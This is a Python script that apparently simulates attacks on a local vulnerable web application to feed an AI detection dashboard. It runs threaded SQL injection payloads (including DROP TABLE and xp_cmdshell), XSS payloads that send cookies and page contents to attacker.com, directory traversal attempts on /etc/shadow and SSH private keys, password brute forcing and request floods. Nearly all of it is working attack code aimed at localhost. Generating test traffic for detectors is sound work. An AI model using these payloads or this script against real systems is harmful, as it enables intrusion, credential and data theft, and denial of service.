
import requests
import time
import threading
import random
from urllib.parse import urlencode

class AttackSimulator:
    def __init__(self, target_url="http://0.0.0.0:3000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.running = False
    
    def sql_injection_attacks(self):
        """Simulate SQL injection attacks"""
        payloads = [
            "admin' OR '1'='1-- ",
            "admin'; DROP TABLE users; -- ",
            "' UNION SELECT username,password,email,role FROM users-- ",
            "admin' UNION SELECT 1,2,3,4-- ",
            "' OR 1=1-- ",
            "admin'/**/OR/**/1=1-- ",
            "admin' OR 'a'='a",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        while self.running:
            try:
                payload = random.choice(payloads)
                
                # Login form SQL injection
                data = {
                    'username': payload,
                    'password': 'test'
                }
                response = self.session.post(f"{self.target_url}/login", data=data)
                print(f"🔍 SQL Injection Login: {payload[:30]}...")
                
                # Search SQL injection
                search_payload = "' UNION SELECT username,password,email,role FROM users-- "
                response = self.session.get(f"{self.target_url}/search?q={search_payload}")
                print(f"🔍 SQL Injection Search: {search_payload[:30]}...")
                
                time.sleep(random.uniform(3, 8))
                
            except Exception as e:
                print(f"❌ SQL Injection error: {e}")
                time.sleep(5)
    
    def xss_attacks(self):
        """Simulate XSS attacks"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
            "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com/steal?data='+btoa(document.innerHTML));xhr.send();</script>"
        ]
        
        while self.running:
            try:
                payload = random.choice(payloads)
                
                data = {
                    'comment': payload
                }
                response = self.session.post(f"{self.target_url}/comment", data=data)
                print(f"🎯 XSS Attack: {payload[:30]}...")
                
                time.sleep(random.uniform(4, 10))
                
            except Exception as e:
                print(f"❌ XSS error: {e}")
                time.sleep(5)
    
    def directory_traversal_attacks(self):
        """Simulate directory traversal attacks"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/shadow",
            "../../../proc/version",
            "..\\..\\..\\boot.ini",
            "../../../../var/log/apache2/access.log",
            "../../../home/user/.ssh/id_rsa",
            "..\\..\\..\\windows\\win.ini"
        ]
        
        while self.running:
            try:
                payload = random.choice(payloads)
                
                response = self.session.get(f"{self.target_url}/file?filename={payload}")
                print(f"📁 Directory Traversal: {payload}")
                
                time.sleep(random.uniform(5, 12))
                
            except Exception as e:
                print(f"❌ Directory Traversal error: {e}")
                time.sleep(5)
    
    def brute_force_attacks(self):
        """Simulate brute force attacks"""
        usernames = ["admin", "administrator", "root", "user", "test", "guest", "demo"]
        passwords = ["123456", "password", "admin", "123123", "qwerty", "letmein", "welcome"]
        
        while self.running:
            try:
                username = random.choice(usernames)
                password = random.choice(passwords)
                
                data = {
                    'username': username,
                    'password': password
                }
                response = self.session.post(f"{self.target_url}/login", data=data)
                print(f"🔐 Brute Force: {username}:{password}")
                
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"❌ Brute Force error: {e}")
                time.sleep(5)
    
    def dos_simulation(self):
        """Simulate DoS attacks"""
        while self.running:
            try:
                # Rapid requests to overwhelm server
                for _ in range(random.randint(20, 50)):
                    response = self.session.get(f"{self.target_url}/")
                    if random.choice([True, False]):
                        response = self.session.get(f"{self.target_url}/search?q=test")
                
                print(f"💥 DoS Simulation: Sent burst of requests")
                time.sleep(random.uniform(10, 20))
                
            except Exception as e:
                print(f"❌ DoS error: {e}")
                time.sleep(5)
    
    def start_attacks(self):
        """Start all attack simulations"""
        self.running = True
        print("🚀 Starting automated attack simulation...")
        
        # Start different attack types in separate threads
        attacks = [
            self.sql_injection_attacks,
            self.xss_attacks,
            self.directory_traversal_attacks,
            self.brute_force_attacks,
            self.dos_simulation
        ]
        
        threads = []
        for attack in attacks:
            thread = threading.Thread(target=attack, daemon=True)
            thread.start()
            threads.append(thread)
        
        return threads
    
    def stop_attacks(self):
        """Stop attack simulation"""
        self.running = False
        print("⏹️  Stopping attack simulation...")

def main():
    print("🎯 Attack Simulator for Vulnerable Web Application")
    print("=" * 50)
    
    simulator = AttackSimulator()
    
    try:
        threads = simulator.start_attacks()
        
        print("⚡ Attack simulation running... Press Ctrl+C to stop")
        print("🌐 Monitor attacks at: http://0.0.0.0:5000 (AI Detection Dashboard)")
        print("🎯 Target application: http://0.0.0.0:3000")
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        simulator.stop_attacks()
        print("\n✅ Attack simulation stopped")

if __name__ == "__main__":
    main()
